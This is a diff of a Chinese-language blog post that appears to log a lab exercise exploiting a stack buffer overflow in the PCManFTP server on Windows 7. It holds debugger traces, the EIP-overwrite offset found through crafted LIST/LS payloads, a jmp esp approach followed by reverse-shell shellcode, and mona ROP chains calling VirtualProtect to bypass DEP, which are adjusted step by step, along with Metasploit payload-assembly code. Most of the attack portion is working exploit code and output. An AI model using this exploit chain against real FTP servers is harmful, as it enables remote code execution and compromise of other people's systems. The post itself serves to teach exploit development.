@@ -117,7 +117,7 @@
 
       <div class="read-time">
         <small>
-          7 minute read
+          19 minute read
         </small>
       </div>
 
@@ -405,11 +405,12 @@ on 192.168.3.177's od:(重复以上加载并resume all threads过程直到中断
     --------------end--------------------
 
 现从405410到427350两个断点之间的指令,如果通过f8,f7,ctrl+f9等的一步一步调试无法到达覆盖eip的关键指令处,而通过在405410断点处直接f9到427350处会经过覆盖eip的关键指令处,然而确无法单步调试到关键指令处。
+
 单步调试时指令经过流程为:
     405410到427350,再由427350到427350
     其中405410到427350流程中无法捕捉到覆盖eip的关键指令,于是指令开始在427350到427350之间一直循环,像是一个进程阻塞当中(eg.listen,accept),427350到427350也无法捕捉到覆盖eip的关键指令,在427350处f9到427350时,情况和下面的405410处f9到427350的情况一样
-但是,
-两个断点之间f9运行调试时:
+
+但是,两个断点之间f9运行调试时:
     在405410处f9到427350时,在堆栈窗口中ctrl+b:41414141却能找到41414141,说明f9运行时,的确经过了覆盖eip的关键指令
 
 出现以上这种现象暂时不能理解,猜测有可能是427350是一个循环等待的函数,并且与有时间相关,如果每次时间超过一定时间(单步调试程序某个线程等待造成时间较长),这个427350处的循环等待判断为无效,即只在一定时间内判定为有效循环等待(这样在427350处f9运行调试到427350处时可以在堆栈窗口捕获到AAAA就可以理解了)
@@ -470,22 +471,27 @@ on 192.168.3.177's od:
     ctrl+g:416685---&gt;f2
     alt+c
     此时自动中断在405410处
+
     ------------output:-----------
     00405410  /$  6A FF         push -0x1
     00405412  |.  68 292D4300   push PCManFTP.00432D29                   ;  SE 处理程序安装
     00405417  |.  64:A1 0000000&gt;mov eax,dword ptr fs:[0]
     0040541D  |.  50            push eax
     --------------end-------------
+
     f9
     此时自动中断在416685处
+
     -----------output：-----------
     00416685  |.  FF15 58524300 call dword ptr ds:[&lt;&amp;KERNEL32.GetLastErr&gt;; [GetLastError
     0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
     00416691  |.  8BF8          mov edi,eax                              ; |
     00416693  |.  FF15 98514300 call dword ptr ds:[&lt;&amp;KERNEL32.TlsGetValu&gt;; \TlsGetValue
     ------------end---------------
+
     f9
     此时又中断到416685处(不过堆栈窗口出现了AAAAAAA)
+
     ------------output：-----------
     00416685  |.  FF15 58524300 call dword ptr ds:[&lt;&amp;KERNEL32.GetLastErr&gt;; [GetLastError
     0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
@@ -535,7 +541,8 @@ esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函�
     0018ED8C   41414141
     -----------------end-------------------
 
-参照http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/中的图stack0易知：
+参照上一篇文章：
+http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/中的图stack0易知：
     
     其中栈中0018ed8c以后很长一段数据都是41414141，由于此时中断到416685而堆栈窗口中首次出现AAAAAA数据，而堆栈窗口中最近的三个返回地址中00412976对应的是本函数栈帧(对应图od2)中的004166e9处的retn，这样的话，很有可能是本函数栈帧的上一帧函数（该函数内的retn对应返回到4029db）或者是上上一帧函数（该函数内的retn对应返回到4029ef）的返回地址被此时栈中的大长串A覆盖成41414141
     当前eip对应的函数帧是00416683函数，当前函数帧的上一帧函数是wsock32.recv，wsock32.recv函数帧的上一函数帧的00412956函数，形如下面表示：
@@ -580,7 +587,9 @@ esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函�
     -------------------------------end----------------------------------
         
     所以有可能当前函数帧（对应图od2）中的汇编语句（执行到4166e9处的retn之前的语句）会导致栈中的两个返回地址(0018ed5c处的004029db和0018ed64处的004029ef)被覆盖,也有可能在wsock32.recv函数帧中某语句覆盖0018ed64处的004029ef，也有可能是本函数帧（00416683，正常情况下esp下面最近一个返回地址在od中显示来自于什么函数则当前eip在该函数帧中）的下一函数帧（也即还没执行到的函数，当前函数帧为最新函数帧）中的汇编语句覆盖两个返回地址或这两个返回地址下面比较远的返回地址等
+
     于是重点关注堆栈窗口中的0018ed5c处的004029db和0018ed64处的004029ef是否可能会在当前函数帧中执行到004166e9之前或下一个将到达的函数帧中被改写成41414141
+
     在od中f8单步调试时，遇到可疑指令如call xxx等，在堆栈窗口中ctrl+g(堆栈中跟随):0018ed5c或0018ed64，然后f8单步调试,具体如下操作：
 
     ------------从图od2中情况下开始的操作-------------
@@ -593,25 +602,32 @@ esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函�
     ..
     f8
     执行到412997处时，在到达这个函数帧中的rent语句前，所有的指令都在wsock32.recv函数帧中，0018ed5c中的返回地址由004029db被改成000000，也即wsock32.recv函数帧中的retn指令被执行时将返回到由004029db变成的00000000,此时栈帧已经被破坏，执行完wsock32.recv函数帧中的retn指令后，将跳到00000000执行，也即在当前帧（wsock32.recv函数帧)中执行到retn语句时，将发生错误，对应汇编指令为：
+
         00412976    5F              pop edi
         00412977    8A16            mov dl,byte ptr ds:[esi]
         00412979    B3 01           mov bl,0x1
         0041297B    0FB6CA          movzx ecx,dl
+
     对应堆栈窗口中0018ed5c和0018ed64处的内容为：
+
         0018ED58   00000000
         0018ED5C   00000000
         0018ED60   01D817A0
         0018ED64   004029EF  返回到 PCManFTP.004029EF 来自 PCManFTP.00412956
         0018ED68   0018ED78  ASCII "LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...
         0018ED6C   01D80F80
+
     而当前函数帧中的retn语句在如下位置004129f9处：
+
         004129F1    F7D8            neg eax
         004129F3    1BC0            sbb eax,eax
         004129F5    23C3            and eax,ebx
         004129F7    5B              pop ebx
         004129F8    C9              leave
         004129F9    C3              retn
+
     所以如果是要将堆栈窗口中0018ed5c处的004029db或0018ed64处的004029ef这两个返回地址覆盖成41414141有极大的可能是在当前函数帧的004129f9处的retn语句前完成，而0018ed64处被覆盖成41414141的可能性更大，因为0018ed5c处已经被覆盖成00000000了
+
     f8
     f8
     ..
@@ -621,6 +637,7 @@ esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函�
     f8
     ..
     f8执行到004129df，以jmp 到004129c1，也即004129c1到004129df相当于一个for循环,004129c1处开始到retn语句前的汇编指令如下：
+
         004129C1    8A02            mov al,byte ptr ds:[edx]
         004129C3    84C0            test al,al
         004129C5    74 1E           je short PCManFTP.004129E5
@@ -653,18 +670,23 @@ esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函�
     -----------------end------------------------
 
     直接在004129df的下一条语句004129e1上f4，发现f4以后eip直接跳到了00416685处的call getlasterror语句上，而不是f4执行到004129e1上，且f4以后0018ed5c处的004029db和0018ed64处的004029ef都被覆盖改写成41414141
+
     说明004129c1到004129df为关键的复制过程，这个过程覆盖了0018ed5c处的004029db和0018ed64处的004029ef
+
     然而在当前wsock32.recv函数帧中，如果覆盖返回地址，一般是只能覆盖到当前函数帧的上一函数帧的返回地址，即覆盖0018ed64处的004029ef，不明白为何连当前函数帧的返回地址也被覆盖成41414141了，这一点不解
+
     猜测是由于windows的消息机制，程序的主线程监视到有函数的返回地址被覆盖成不可执行的地址41414141时，进入异常处理链开始执行（由于主线程优先级高，于是出问题后不去41414141处执行，也不去原来wsock32.recv函数帧当中按f4处的004129e1执行）,发现没有专门对应的exception handler，最后调用unhandled exceptionfilter(后来f8单步发现是有call unhandled exceptionfilter)处理这个异常，最后弹出图error的对话框，认为有某一刻eip=41414141，但是这一刻没有在单步调试中出现，认为由004129e1处突然跳到了call getlasterror的过程中，实际上是先到eip=41414141处，然后再跳到到call getlasterror处,或许是由于这个过程太快或比较特殊而没有被od捕捉到因而没有遇到eip=41414141的时刻
+
     但是现在不能确定是0018ed5c处被覆盖成的41414141还是0018ed64处被覆盖的41414141是真正的那一刻eip=41414141的时刻而引起的主线程优先进入异常处理
+
     理论上是在004129e1处f4的时候，由于还在wsock32.recv函数帧当中，返回的先后顺序是先返回到0018ed5c处被覆盖的41414141再返回到0018ed64处被覆盖的41414141，然而0018ed5c原来被覆盖成00000000时是可以理解的，被覆盖成41414141是不可理解的，于是这两种可能性都不能确定
 
     在内存中覆盖时AAAA的数据由0018e58e开始到0018ed64共2006个字节，由0018e58e开始到0018ed5c共1998个字节，重新发送1998xA+BBBB+CCCC+DDDD到pcmanftp，不用od加载，看看最后的error对话框中的异常位移是多少
-    向pcmanftp发送Ax1998+Bx4+Cx4+Dx4发现不能使pcmanftp停止工作
-    于是发送Ax1998+Bx4+Cx4+Dx4+Ex6990(共9000个字节)
-    成功使之停止工作，但是弹出对应error图中对话框中的异常偏移为45444444，也即对应EDDD，这样应该是说明是0018ed64处的41414141被覆盖，但是又相差一个字节，不知是那里算错了，暂且不纠结于此
-    发送Ax1998+Bx4+Cx4+Dx4+F+Ex6989（共9000个字节）
-    成功使之停止工作，且异常偏移显示为46444444，说明发送的9000个字节中，第2008到2011个字节处为覆盖eip处，构造exploit,发现与https://www.exploit-db.com/exploits/39662/链接中的偏移情况相同，都是在第2008-2011个字节处为覆盖返回地址的eip处,在这里填入jmp esp的地址后，再在后面填入用于反弹的shellcode即可，不同的是exploit-db中的是winxpsp3 eng环境，而此处环境为win7x64的中文系统环境
+
+    向pcmanftp发送Ax1998+Bx4+Cx4+Dx4发现不能使pcmanftp停止工作,于是发送Ax1998+Bx4+Cx4+Dx4+Ex6990(共9000个字节),成功使之停止工作，但是弹出对应error图中对话框中的异常偏移为45444444，也即对应EDDD，这样应该是说明是0018ed64处的41414141被覆盖，但是又相差一个字节，不知是那里算错了，暂且不纠结于此
+    
+    发送Ax1998+Bx4+Cx4+Dx4+F+Ex6989（共9000个字节）,成功使之停止工作，且异常偏移显示为46444444，说明发送的9000个字节中，第2008到2011个字节处为覆盖eip处，构造exploit,发现与https://www.exploit-db.com/exploits/39662/链接中的偏移情况相同，都是在第2008-2011个字节处为覆盖返回地址的eip处,在这里填入jmp esp的地址后，再在后面填入用于反弹的shellcode即可，不同的是exploit-db中的是winxpsp3 eng环境，而此处环境为win7x64的中文系统环境
+    
     在192.168.3.177中运行pcmanftp后od附加，alt+e选择一个系统dll（实验中选择的是c:\windows\system32\ntdll.dll）,在od中ctrl+f：jmp esp找到一个地址为77506aeb，构造的exploit如下：
 
     -------------------------exploit.rb---------------------------------
@@ -776,19 +798,660 @@ exploit情况说明：
 
 <h4 id="dep-on">2&gt;dep on</h4>
 
-<p>实验中win2003系统中dep开启如下:</p>
+<p>实验中win7x64系统中dep开启如下:</p>
 
 <p><img src="https://raw.githubusercontent.com/xinghuacai/pic/master/dep_open_on_win7.png" /></p>
 
-<p>参考泉哥的小结http://www.blogbus.com/riusksk-logs/80935313.html
-实现win7绕过dep</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>参考
+http://www.blogbus.com/riusksk-logs/80935313.html
+http://drops.wooyun.org/papers/3602
 
-<p>mona插件：
+目的
+实现win7绕过dep并成功溢出pcmanftp
+
+mona插件
     https://github.com/corelan/mona
     https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
     https://huirong.github.io/2015/12/18/mona/
     http://www.cnphp6.com/archives/45078
-    http://drops.wooyun.org/tips/6814</p>
+    http://drops.wooyun.org/tips/6814
+
+在immunity debugger中执行!mona rop -m *.dll -cp nonull,将得到如下(rop_chains.txt中)建议的rop_gadgets:
+
+-------------rop_gadgets_from_mona____________
+def create_rop_chain()
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = 
+    [
+      0x027c9a7a,  # POP ECX # RETN [knb3rdhmpg.dll] 
+      0x73c112d0,  # ptr to &amp;VirtualProtect() [IAT OLEACC.dll]
+      0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
+      0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
+      0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
+      0x74916f14,  # &amp; push esp # ret  [RICHED20.dll]
+      0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
+      0xfffffdff,  # Value to negate, will become 0x00000201
+      0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
+      0x7727060d,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
+      0x027f509d,  # POP EAX # RETN [knb3rdhmpg.dll] 
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x717d1e67,  # NEG EAX # RETN [winrnr.dll] 
+      0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
+      0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
+      0x7647d27c,  # &amp;Writable location [USP10.dll]
+      0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
+      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
+      0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
+      0x90909090,  # nop
+      0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
+    ].flatten.pack("V*")
+
+    return rop_gadgets
+
+  end
+------------------end-------------------------
+
+在pcmanftp中，重启系统后在上面的exploit.rb中将offset由2007改成2008,有可能是重启导致的一个字节的相差
+
+mona中给出rop_gadgets只是参考的rop，并不代表一定可用，且最新v2版本似乎有点错误，mona算出的rop_gadgets中的第一个地址0x027c9a7a在od中ctrl+g查看一下发现不是对应pop ecx,retn的地址，且有一些地址是执行会产生问题的，这时需要结合od在实际情况中调试
+
+实际调试中发现上面的第10个地址0x7727060d对应的XCHG EAX，EBX+retn在od中ctrl+g：7727060d确实是对应xchg eax，ebx+retn指令的，但是如果第10个地址用7727060d,在od跟踪pcmanftp(在402a26处下断，并f7,再f8,f8,...)中00402a26处的call 403e60后（402a26处的call 403e60汇编语句的下一句汇编语句的地址为402a2b，在上面dep off的实验中是堆栈窗口中的18ed64处的402a2b被改成jmp esp的地址）发现堆栈窗口中从18ed64处开始的对应的第10个地址会被改写，比较奇怪，认为是这个地址出了问题，从rop_suggestions.txt中找另外的XCHG EAX，EBX+RETN对应的地址代替后不会有这个问题
+
+pcmanftp中的关键断点：
+    00402a26处的call 403e60
+        403e60函数帧里面的403ee6处的call 00412cbf
+            412cbf函数帧里面的412ce8处的call 00416c5c
+
+继续od跟踪看哪些地址还需修改
+
+运行pcmanftp后od附加，在00402a26处下断,msf发送包含下面rop_gadgets的数据到192.168.3.177
+
+------------------changing rop_gadgets--------------
+   def create_rop_chain()
+        rop_gadgets = 
+        [
+          0x778a45e1,  # POP ECX # RETN [knb3rdhmpg.dll] 
+          0x73c112d0,  # ptr to &amp;VirtualProtect() [IAT OLEACC.dll]
+          0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
+          0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
+          0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
+          0x74916f14,  # &amp; push esp # ret  [RICHED20.dll]
+          0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
+          0xfffffdff,  # Value to negate, will become 0x00000201
+          0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
+          0x756bd259,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
+          0x74923ca7,  # POP EAX # RETN [knb3rdhmpg.dll] 
+          0xffffffc0,  # Value to negate, will become 0x00000040
+          0x76cc4402,  # NEG EAX # RETN [winrnr.dll] 
+          0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
+          0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
+          0x7647d27c,  # &amp;Writable location [USP10.dll]
+          0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
+          0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
+          0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
+          0x90909090,  # nop
+          0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
+        ].flatten.pack("V*")
+        return rop_gadgets
+      end
+-----------------------end--------------------------
+
+其中向192.168.3.177中pcmanftp发送的数据在下面的sploit变量中：
+
+-----------------------sploit---------------------
+     sploit = rand_text_alpha(target['Offset'])
+    
+        #tmp = sploit
+        #print_status(tmp)
+        sploit &lt;&lt; create_rop_chain()
+        sploit &lt;&lt; make_nops(30)
+        sploit &lt;&lt; "\xcc"
+        sploit &lt;&lt; payload.encoded
+------------------------end-----------------------
+
+在msf发送完数据时，要在od中ctrl+v---&gt;t---&gt;resume all threads,原因见上面dep off情况中的分析
+resume all threads后，pcmanftp中断在00402a26,f9再运行到00402a26,此时开始处理sploit变量中的send_cmd( ["ls", sploit], false ),第一次中断到402a26处为处理anonymous登录相关的字符串
+此时汇编窗口中的数据如下所示，eip=402a26
+
+    00402A26    E8 35140000     call PCManFTP.00403E60
+    00402A2B    8A46 03         mov al,byte ptr ds:[esi+0x3]
+    00402A2E    84C0            test al,al
+    00402A30    75 04           jnz short PCManFTP.00402A36
+    00402A32    C646 03 20      mov byte ptr ds:[esi+0x3],0x20
+    00402A36    56              push esi
+    00402A37    8BCD            mov ecx,ebp
+    00402A39    E8 22000000     call PCManFTP.00402A60
+    00402A3E    68 DC114400     push PCManFTP.004411DC                   ; ASCII "
+    "
+    00402A43    6A 00           push 0x0
+    00402A45    E8 0CFF0000     call PCManFTP.00412956
+    00402A4A    8BF0            mov esi,eax
+    00402A4C    83C4 08         add esp,0x8
+    00402A4F    85F6            test esi,esi
+    00402A51  ^ 75 A6           jnz short PCManFTP.004029F9
+    00402A53    5F              pop edi                                  ; 0018ED78
+    00402A54    5E              pop esi                                  ; 0018ED78
+    00402A55    5D              pop ebp                                  ; 0018ED78
+    00402A56    81C4 04100000   add esp,0x1004
+    00402A5C    C2 0400         retn 0x4
+
+此时堆栈中18ed64处的返回地址还没有被覆盖，如下所示：
+
+    0018ED5C   00000000
+    0018ED60   00000000
+    0018ED64   00402A05  PCManFTP.00402A05
+    0018ED68   0018ED78  ASCII "LS XnVkIvmqpcmSqSVEClMqFIHQzEBjHrHLdzEnDtwxDnbcqTqseEHLARmjMQrGaiNEnQpxxbUisIZaqPwjoePQmmCPMzhAZDIhYffDXdhLCrWCyhuidqcfuMFhMZecDDopTpMGWcQShqwfgLoDFfnSHbUvoEMVuDLiFEYfaTFfCAAoDuwasvaujuFloUrmoYzyyWqkvXOxkMBqUsTwpPZkbQalYgrryMvEeYywOCAiJv"...
+    0018ED6C   00000402
+    0018ED70   00000000
+
+其中0018ed5c处的返回地址已经被覆盖成00000000，18ed68处的的指针对应的是msf中的sploit变量的数据
+od中f7进入403e60函数帧：
+
+    00403E60    A1 40354400     mov eax,dword ptr ds:[0x443540]
+    00403E65    81EC 14080000   sub esp,0x814
+    00403E6B    85C0            test eax,eax
+    00403E6D    56              push esi
+    00403E6E    57              push edi
+    00403E6F    8BF1            mov esi,ecx
+    00403E71    75 0D           jnz short PCManFTP.00403E80
+    00403E73    A1 48354400     mov eax,dword ptr ds:[0x443548]
+    00403E78    85C0            test eax,eax
+    00403E7A    0F84 31010000   je PCManFTP.00403FB1
+    00403E80    8D4424 08       lea eax,dword ptr ss:[esp+0x8]
+    00403E84    50              push eax
+    00403E85    FF15 A8524300   call dword ptr ds:[&lt;&amp;KERNEL32.GetLocalTi&gt;; kernel32.GetLocalTime
+    00403E8B    8B46 24         mov eax,dword ptr ds:[esi+0x24]
+    00403E8E    85C0            test eax,eax
+    00403E90    74 05           je short PCManFTP.00403E97
+    00403E92    8B40 08         mov eax,dword ptr ds:[eax+0x8]
+    00403E95    EB 03           jmp short PCManFTP.00403E9A
+    00403E97    8B46 04         mov eax,dword ptr ds:[esi+0x4]
+    00403E9A    8BBC24 20080000 mov edi,dword ptr ss:[esp+0x820]
+    00403EA1    8B5424 12       mov edx,dword ptr ss:[esp+0x12]
+    00403EA5    8B4E 0C         mov ecx,dword ptr ds:[esi+0xC]
+    00403EA8    57              push edi
+    00403EA9    50              push eax
+    00403EAA    8B4424 18       mov eax,dword ptr ss:[esp+0x18]
+    00403EAE    81E2 FFFF0000   and edx,0xFFFF
+    00403EB4    51              push ecx
+    00403EB5    8B4C24 1A       mov ecx,dword ptr ss:[esp+0x1A]
+    00403EB9    25 FFFF0000     and eax,0xFFFF
+    00403EBE    52              push edx
+    00403EBF    8B5424 1A       mov edx,dword ptr ss:[esp+0x1A]
+    00403EC3    50              push eax
+    00403EC4    8B4424 1C       mov eax,dword ptr ss:[esp+0x1C]
+    00403EC8    81E1 FFFF0000   and ecx,0xFFFF
+    00403ECE    81E2 FFFF0000   and edx,0xFFFF
+    00403ED4    51              push ecx
+    00403ED5    25 FFFF0000     and eax,0xFFFF
+    00403EDA    52              push edx
+    00403EDB    50              push eax
+    00403EDC    8D4C24 3C       lea ecx,dword ptr ss:[esp+0x3C]
+    00403EE0    68 D4164400     push PCManFTP.004416D4                   ; ASCII "%d/%d/%d [%02d:%02d] (%05d) %s&gt; %s
+    "
+    00403EE5    51              push ecx
+    00403EE6    E8 D4ED0000     call PCManFTP.00412CBF
+    00403EEB    8B0D 14354400   mov ecx,dword ptr ds:[0x443514]
+    00403EF1    83C4 28         add esp,0x28
+    00403EF4    83F9 FF         cmp ecx,-0x1
+    00403EF7    74 14           je short PCManFTP.00403F0D
+    00403EF9    8D5424 18       lea edx,dword ptr ss:[esp+0x18]
+    00403EFD    6A 00           push 0x0
+    00403EFF    52              push edx
+    00403F00    50              push eax
+    00403F01    8D4424 28       lea eax,dword ptr ss:[esp+0x28]
+    00403F05    50              push eax
+    00403F06    51              push ecx
+    00403F07    FF15 C8524300   call dword ptr ds:[&lt;&amp;KERNEL32.WriteFile&gt;&gt;; kernel32.WriteFile
+    00403F0D    A1 48354400     mov eax,dword ptr ds:[0x443548]
+    00403F12    85C0            test eax,eax
+    00403F14    0F84 97000000   je PCManFTP.00403FB1
+    00403F1A    E8 1FCC0100     call PCManFTP.00420B3E
+    00403F1F    85C0            test eax,eax
+    00403F21    0F84 8A000000   je PCManFTP.00403FB1
+    00403F27    8B10            mov edx,dword ptr ds:[eax]
+    00403F29    8BC8            mov ecx,eax
+    00403F2B    FF52 74         call dword ptr ds:[edx+0x74]
+    00403F2E    85C0            test eax,eax
+    00403F30    74 7F           je short PCManFTP.00403FB1
+    00403F32    0FBE07          movsx eax,byte ptr ds:[edi]
+    00403F35    50              push eax
+    00403F36    E8 25EF0000     call PCManFTP.00412E60
+    00403F3B    83C4 04         add esp,0x4
+    00403F3E    85C0            test eax,eax
+    00403F40    74 4A           je short PCManFTP.00403F8C
+    00403F42    E8 F7CB0100     call PCManFTP.00420B3E
+    00403F47    85C0            test eax,eax
+    00403F49    74 23           je short PCManFTP.00403F6E
+    00403F4B    8B10            mov edx,dword ptr ds:[eax]
+    00403F4D    8BC8            mov ecx,eax
+    00403F4F    FF52 74         call dword ptr ds:[edx+0x74]
+    00403F52    8D4C24 1C       lea ecx,dword ptr ss:[esp+0x1C]
+    00403F56    51              push ecx
+    00403F57    68 00800000     push 0x8000
+    00403F5C    8BC8            mov ecx,eax
+    00403F5E    E8 8D5D0000     call PCManFTP.00409CF0
+    00403F63    5F              pop edi                                  ; PCManFTP.00402A2B
+    00403F64    5E              pop esi                                  ; PCManFTP.00402A2B
+    00403F65    81C4 14080000   add esp,0x814
+    00403F6B    C2 0400         retn 0x4
+
+一直f8到上面403ee6处的call 00412cbf,暂时不跟进，再按f8之后将完成18ed64处的返回地址被覆盖
+f8后18ed64处的覆盖内容如下：
+    
+    0018ED5C   564F514E  #此时此处的原来被覆盖成00000000的wsock.revc函数的返回地址被覆盖成另外的值
+    0018ED60   6475586A
+    0018ED64   778A45E1  返回到 ntdll_12.778A45E1 来自 ntdll_12.DbgPrint
+    0018ED68   73C112D0  &lt;&amp;KERNEL32.VirtualProtect&gt;
+    0018ED6C   76969312  ole32.76969312
+    0018ED70   753C6833  返回到 KernelBa.753C6833
+    0018ED74   76B5E6E8  msvcrt.76B5E6E8
+    0018ED78   74916F14  riched20.74916F14
+    0018ED7C   76B93866  msvcrt.76B93866
+    0018ED80   FFFFFDFF
+    0018ED84   76BB2FD0  msctf.76BB2FD0
+    0018ED88   756BD259  shell32.756BD259
+    0018ED8C   74923CA7  riched20.74923CA7
+    0018ED90   FFFFFFC0
+    0018ED94   76CC4402  user32.76CC4402
+    0018ED98   753FD586  comdlg32.753FD586
+    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
+    0018EDA0   7647D27C  usp10.7647D27C
+    0018EDA4   759D4AAD  shell32.759D4AAD
+    0018EDA8   76CC4404  user32.76CC4404
+    0018EDAC   7364681F  comctl32.7364681F
+    0018EDB0   90909090
+    0018EDB4   772B73DF  oleaut32.772B73DF
+    0018EDB8   939F4848
+    0018EDBC   3F9BD691
+    0018EDC0   4E274E37
+    0018EDC4   D6439937
+    0018EDC8   4B484393
+    0018EDCC   91FDF948
+    0018EDD0   479FFC4E
+    0018EDD4   F8CC4691
+
+其中rop_gadgets数据已经完全和发送的一样，而rop_gadgets后0018edb8处开始到0018edd5原来应该是30个nop+”\xcc“,其中的30个nop数据不是nop数据了，”\xcc“没变
+
+在od中ctrl+f9运行到retn，然后再f8,此时eip=rop_gadgets中第一个数据，然后再f8..f8看看哪里会出问题
+
+f8跟踪到0018edb4处的772b73df，772b73df中的指令为pushad retn,可想，执行完pushad后esp就上移了，这样再retn的话retn到的便不是rop_gadgets中的原来的应该是30个nop处的地方（现在被改写了，不再是30个nop）
+
+觉得是mona的错误，不应该在最后加个poshad+retn的地址，将rop_gadgets中最后的pushad+retn的地址删除后再重新发送sploit数据并跟踪到rop_gadgets中第一个数据，然后再f8..f8看看哪里会出问题
+
+再次进入到rop_gadgets中的第一个地址778a45e1处，此时eip=778a45e1，堆栈窗口中的18ed64处的数据为：
+
+    0018ED64   778A45E1  ntdll_12.778A45E1
+    0018ED68   73C112D0  &lt;&amp;KERNEL32.VirtualProtect&gt;
+    0018ED6C   76969312  ole32.76969312
+    0018ED70   753C6833  返回到 KernelBa.753C6833
+    0018ED74   76B5E6E8  msvcrt.76B5E6E8
+    0018ED78   74916F14  riched20.74916F14
+    0018ED7C   76B93866  msvcrt.76B93866
+    0018ED80   FFFFFDFF
+    0018ED84   76BB2FD0  msctf.76BB2FD0
+    0018ED88   756BD259  shell32.756BD259
+    0018ED8C   74923CA7  riched20.74923CA7
+    0018ED90   FFFFFFC0
+    0018ED94   76CC4402  user32.76CC4402
+    0018ED98   753FD586  comdlg32.753FD586
+    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
+    0018EDA0   7647D27C  usp10.7647D27C
+    0018EDA4   759D4AAD  shell32.759D4AAD
+    0018EDA8   76CC4404  user32.76CC4404
+    0018EDAC   7364681F  comctl32.7364681F
+    0018EDB0   90909090
+    0018EDB4   4A4E96F5
+    0018EDB8   4841F59B
+    0018EDBC   48FD4B99
+    0018EDC0   93909899
+    0018EDC4   93989B4F
+    0018EDC8   904242F9
+    0018EDCC   98379648
+    0018EDD0   90CC2797
+
+对比观察发现rop_gadgets中的地址还没开始执行（eip=778a45e1）时,后面的rop_gadgets数据不变，但是后面30个nop还是被改成其他数据,尝试将后面的30个nop改成41414141...再次跟踪到eip=rop_gadgets中的第一个地址778a45e1时，堆栈窗口中的数据如下：
+
+    0018ED64   778A45E1  ntdll_12.778A45E1
+    0018ED68   73C112D0  &lt;&amp;KERNEL32.VirtualProtect&gt;
+    0018ED6C   76969312  ole32.76969312
+    0018ED70   753C6833  返回到 KernelBa.753C6833
+    0018ED74   76B5E6E8  msvcrt.76B5E6E8
+    0018ED78   74916F14  riched20.74916F14
+    0018ED7C   76B93866  msvcrt.76B93866
+    0018ED80   FFFFFDFF
+    0018ED84   76BB2FD0  msctf.76BB2FD0
+    0018ED88   756BD259  shell32.756BD259
+    0018ED8C   74923CA7  riched20.74923CA7
+    0018ED90   FFFFFFC0
+    0018ED94   76CC4402  user32.76CC4402
+    0018ED98   753FD586  comdlg32.753FD586
+    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
+    0018EDA0   7647D27C  usp10.7647D27C
+    0018EDA4   759D4AAD  shell32.759D4AAD
+    0018EDA8   76CC4404  user32.76CC4404
+    0018EDAC   7364681F  comctl32.7364681F
+    0018EDB0   90909090
+    0018EDB4   41414141
+    0018EDB8   41414141
+    0018EDBC   41414141
+    0018EDC0   41414141
+    0018EDC4   41414141
+    0018EDC8   41414141
+    0018EDCC   41414141
+    0018EDD0   4FCC4141
+
+发现这时后面的30个41还是正常的没有被改变的，这样说明应该是win7x64位系统下开户dep后，栈中覆盖好的nop串会被改变成其他随机的填充数据,也有可能是nop串太长为30个时才会这样，考虑到上一篇文中
+
